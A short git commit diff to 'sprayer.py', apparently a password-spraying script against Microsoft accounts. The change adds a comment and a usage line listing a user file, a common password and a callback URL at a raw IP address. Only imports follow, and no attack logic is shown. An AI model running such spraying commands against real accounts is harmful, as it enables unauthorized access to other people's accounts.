7b556c5b277b5bb3a687ebff8b1681af1b84d516
raceconditionss <jadxgui@gmail.com>
2025-11-18 11:03:55 -0300

    Update sprayer.py

--- sprayer.py
+++ sprayer.py
@@ -1,4 +1,5 @@
-# python3 kicker.py -u userlist.txt -p "P1assword123" -c http://3.95.37.64/wow-amazing -s
+# this demo performs pass spray in microsoft
+## python3 kicker.py -u userlist.txt -p "P1assword123" -c http://3.95.37.64/wow-amazing -s
 import requests
 import os
 from urllib3.exceptions import InsecureRequestWarning
